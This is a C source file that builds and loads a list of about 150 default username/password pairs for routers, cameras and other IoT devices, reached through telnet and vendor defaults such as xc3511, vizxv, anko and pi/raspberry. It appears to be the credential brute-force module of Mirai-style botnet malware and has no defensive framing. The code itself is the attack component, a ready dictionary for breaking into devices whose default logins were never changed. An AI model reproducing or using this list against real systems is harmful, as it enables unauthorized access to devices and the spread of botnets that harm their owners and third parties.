#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "headers/combos.h"

int cindex = 0;
Combo *combos = NULL;

void combo_add(char *username, char *password)
{
    if (combos == NULL)
        combos = calloc(1, sizeof(Combo));
    else
        combos = realloc(combos, (cindex + 2) * sizeof(Combo));

    combos[cindex].username = username;
    combos[cindex].password = password;

    combos[cindex].username_len = strlen(username);
    combos[cindex].password_len = strlen(password);
    cindex++;
}

void combos_init(void)
{
    combo_add("root", "");
    combo_add("support", "support");
    combo_add("admin", "");
    combo_add("root", "root");
    combo_add("admin", "admin");
    combo_add("user", "user");
    combo_add("ubnt", "ubnt");
    combo_add("ubuntu", "ubuntu");
    combo_add("guest", "guest");
    combo_add("support", "support");
    combo_add("default", "default");
    combo_add("test", "test");
    combo_add("fake", "fake");
    combo_add("root", "admin");
    combo_add("admin", "root");
    combo_add("root", "123");
    combo_add("root", "1234");
    combo_add("root", "12345");
    combo_add("root", "123456");
    combo_add("root", "changeme");
    combo_add("admin", "changeme");
    combo_add("guest", "1234");
    combo_add("guest", "12345");
    combo_add("guest", "123456");
    combo_add("admin", "1234");
    combo_add("admin", "12345");
    combo_add("admin", "123456");
    combo_add("hikvision", "hikvision");
    combo_add("root", "toor");
    combo_add("", "");
    combo_add("operator", "operator");
    combo_add("ftp", "ftp");
    combo_add("root", "888888");
    combo_add("default", "");
    combo_add("1234", "1234");
    combo_add("12345", "12345");
    combo_add("123456", "123456");
    combo_add("1234567", "1234567");
    combo_add("12345678", "12345678");
    combo_add("123456789", "123456789");
    combo_add("1234567890", "1234567890");
    combo_add("12345678901", "12345678901");
    combo_add("123456789012", "123456789012");
    combo_add("admin", "VnT3ch@dm1n");
    combo_add("root", "VnT3ch@dm1n");
    combo_add("root", "86981198");
    combo_add("admin", "86981198");
    combo_add("tech", "tech");
    combo_add("root", "vizxv");
    combo_add("admin", "vizxv");
    combo_add("support", "vizxv");
    combo_add("administrator", "administrator");
    combo_add("support", "86981198");
    combo_add("support", "VnT3ch@dm1n");
    combo_add("support", "VnT3ch@dm1n");
    combo_add("root", "system");
    combo_add("admin", "system");
    combo_add("support", "system");
    combo_add("administrator", "system");
    combo_add("root", "1234567890");
    combo_add("admin", "1234567890");
    combo_add("support", "1234567890");
    combo_add("administrator", "1234567890");
    combo_add("root", "12345678901");
    combo_add("administrator", "password");
    combo_add("root", "password");
    combo_add("admin", "password");
    combo_add("support", "password");
    combo_add("administrator", "password");
    combo_add("root", "123456789012");
    combo_add("admin", "123456789012");
    combo_add("support", "123456789012");
    combo_add("administrator", "123456789012");
    combo_add("administrator", "admin");
    combo_add("root", "xc3511");
    combo_add("admin", "xc3511");
    combo_add("support", "xc3511");
    combo_add("administrator", "xc3511");
    combo_add("root", "xc3511");
    combo_add("admin", "xc3511");
    combo_add("support", "xc3511");
    combo_add("administrator", "xc3511");
    combo_add("root", "1234567890123");
    combo_add("admin", "1234567890123");
    combo_add("support", "1234567890123");
    combo_add("administrator", "1234567890123");
    combo_add("root", "12345678901234");
    combo_add("admin", "12345678901234");
    combo_add("support", "12345678901234");
    combo_add("administrator", "12345678901234");
    combo_add("root", "anko");
    combo_add("admin", "anko");
    combo_add("support", "anko");
    combo_add("administrator", "anko");
    combo_add("root", "123456789012345");
    combo_add("admin", "123456789012345");
    combo_add("support", "123456789012345");
    combo_add("administrator", "123456789012345");
    combo_add("root", "1234567890123456");
    combo_add("root", "icatch99");
    combo_add("admin", "icatch99");
    combo_add("support", "icatch99");
    combo_add("administrator", "icatch99");
    combo_add("pi", "pi");
    combo_add("root", "pi");
    combo_add("admin", "pi");
    combo_add("support", "pi");
    combo_add("administrator", "pi");
    combo_add("raspberry", "raspberry");
    combo_add("root", "raspberry");
    combo_add("admin", "raspberry");
    combo_add("support", "raspberry");
    combo_add("administrator", "raspberry");
    combo_add("pi", "raspberry");
    combo_add("raspberry", "pi");
    combo_add("cisco", "cisco");
    combo_add("root", "cisco");
    combo_add("admin", "cisco");
    combo_add("support", "cisco");
    combo_add("administrator", "cisco");
    combo_add("root", "admin1234");
    combo_add("admin", "admin1234");
    combo_add("support", "admin1234");
    combo_add("administrator", "admin1234");
    combo_add("root", "admin12345");
    combo_add("admin", "admin12345");
    combo_add("support", "admin12345");
    combo_add("administrator", "admin12345");
    combo_add("telnet", "telnet");
    combo_add("root", "telnet");
    combo_add("admin", "telnet");
    combo_add("support", "telnet");
    combo_add("administrator", "telnet");
    combo_add("root", "default");
    combo_add("admin", "default");
    combo_add("support", "default");
    combo_add("administrator", "default");
    combo_add("telnet", "default");
    combo_add("default", "telnet");
}
